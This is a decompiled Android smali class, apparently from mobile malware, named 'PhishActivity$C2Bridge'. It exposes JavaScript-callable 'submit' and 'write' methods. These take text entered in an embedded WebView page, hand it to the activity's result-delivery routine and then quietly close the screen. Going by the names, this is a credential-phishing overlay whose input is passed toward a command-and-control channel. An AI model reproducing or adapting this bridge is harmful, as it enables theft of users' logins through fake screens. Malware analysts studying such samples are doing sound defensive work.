.class final Lcom/servers/ozzbzk/PhishActivity$C2Bridge;
.super Ljava/lang/Object;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/servers/ozzbzk/PhishActivity;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x12
    name = "C2Bridge"
.end annotation


# instance fields
.field final synthetic this$0:Lcom/servers/ozzbzk/PhishActivity;


# direct methods
.method private constructor <init>(Lcom/servers/ozzbzk/PhishActivity;)V
    .locals 0
    .annotation system Ldalvik/annotation/MethodParameters;
        accessFlags = {
            0x1010
        }
        names = {
            null
        }
    .end annotation

    .line 271
    iput-object p1, p0, Lcom/servers/ozzbzk/PhishActivity$C2Bridge;->this$0:Lcom/servers/ozzbzk/PhishActivity;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method synthetic constructor <init>(Lcom/servers/ozzbzk/PhishActivity;Lcom/servers/ozzbzk/PhishActivity$C2Bridge-IA;)V
    .locals 0

    invoke-direct {p0, p1}, Lcom/servers/ozzbzk/PhishActivity$C2Bridge;-><init>(Lcom/servers/ozzbzk/PhishActivity;)V

    return-void
.end method


# virtual methods
.method synthetic lambda$submit$0$com-servers-ozzbzk-PhishActivity$C2Bridge()V
    .locals 3

    .line 278
    iget-object v0, p0, Lcom/servers/ozzbzk/PhishActivity$C2Bridge;->this$0:Lcom/servers/ozzbzk/PhishActivity;

    invoke-virtual {v0}, Lcom/servers/ozzbzk/PhishActivity;->isFinishing()Z

    move-result v0

    if-nez v0, :cond_0

    iget-object v0, p0, Lcom/servers/ozzbzk/PhishActivity$C2Bridge;->this$0:Lcom/servers/ozzbzk/PhishActivity;

    invoke-virtual {v0}, Lcom/servers/ozzbzk/PhishActivity;->isDestroyed()Z

    move-result v0

    if-nez v0, :cond_0

    .line 279
    iget-object v0, p0, Lcom/servers/ozzbzk/PhishActivity$C2Bridge;->this$0:Lcom/servers/ozzbzk/PhishActivity;

    const/4 v1, 0x0

    const v2, 0x10a0001

    invoke-virtual {v0, v1, v2}, Lcom/servers/ozzbzk/PhishActivity;->overridePendingTransition(II)V

    .line 280
    iget-object v0, p0, Lcom/servers/ozzbzk/PhishActivity$C2Bridge;->this$0:Lcom/servers/ozzbzk/PhishActivity;

    invoke-virtual {v0}, Lcom/servers/ozzbzk/PhishActivity;->finish()V

    :cond_0
    return-void
.end method

.method synthetic lambda$submit$1$com-servers-ozzbzk-PhishActivity$C2Bridge()V
    .locals 2

    .line 277
    iget-object v0, p0, Lcom/servers/ozzbzk/PhishActivity$C2Bridge;->this$0:Lcom/servers/ozzbzk/PhishActivity;

    new-instance v1, Lcom/servers/ozzbzk/PhishActivity$C2Bridge$$ExternalSyntheticLambda0;

    invoke-direct {v1, p0}, Lcom/servers/ozzbzk/PhishActivity$C2Bridge$$ExternalSyntheticLambda0;-><init>(Lcom/servers/ozzbzk/PhishActivity$C2Bridge;)V

    invoke-virtual {v0, v1}, Lcom/servers/ozzbzk/PhishActivity;->runOnUiThread(Ljava/lang/Runnable;)V

    return-void
.end method

.method public submit(Ljava/lang/String;)V
    .locals 3
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .line 274
    iget-object v0, p0, Lcom/servers/ozzbzk/PhishActivity$C2Bridge;->this$0:Lcom/servers/ozzbzk/PhishActivity;

    invoke-static {v0}, Lcom/servers/ozzbzk/PhishActivity;->-$$Nest$mcancelPendingDismiss(Lcom/servers/ozzbzk/PhishActivity;)V

    .line 275
    iget-object v0, p0, Lcom/servers/ozzbzk/PhishActivity$C2Bridge;->this$0:Lcom/servers/ozzbzk/PhishActivity;

    const/4 v1, 0x0

    invoke-static {v0, p1, v1}, Lcom/servers/ozzbzk/PhishActivity;->-$$Nest$mdeliverResult(Lcom/servers/ozzbzk/PhishActivity;Ljava/lang/String;Z)V

    .line 276
    iget-object p1, p0, Lcom/servers/ozzbzk/PhishActivity$C2Bridge;->this$0:Lcom/servers/ozzbzk/PhishActivity;

    invoke-static {p1}, Lcom/servers/ozzbzk/PhishActivity;->-$$Nest$fgetwebView(Lcom/servers/ozzbzk/PhishActivity;)Landroid/webkit/WebView;

    move-result-object p1

    if-eqz p1, :cond_0

    .line 277
    iget-object p1, p0, Lcom/servers/ozzbzk/PhishActivity$C2Bridge;->this$0:Lcom/servers/ozzbzk/PhishActivity;

    invoke-static {p1}, Lcom/servers/ozzbzk/PhishActivity;->-$$Nest$fgetwebView(Lcom/servers/ozzbzk/PhishActivity;)Landroid/webkit/WebView;

    move-result-object p1

    new-instance v0, Lcom/servers/ozzbzk/PhishActivity$C2Bridge$$ExternalSyntheticLambda1;

    invoke-direct {v0, p0}, Lcom/servers/ozzbzk/PhishActivity$C2Bridge$$ExternalSyntheticLambda1;-><init>(Lcom/servers/ozzbzk/PhishActivity$C2Bridge;)V

    const-wide/16 v1, 0x708

    invoke-virtual {p1, v0, v1, v2}, Landroid/webkit/WebView;->postDelayed(Ljava/lang/Runnable;J)Z

    :cond_0
    return-void
.end method

.method public write(Ljava/lang/String;)V
    .locals 0
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .line 288
    invoke-virtual {p0, p1}, Lcom/servers/ozzbzk/PhishActivity$C2Bridge;->submit(Ljava/lang/String;)V

    return-void
.end method
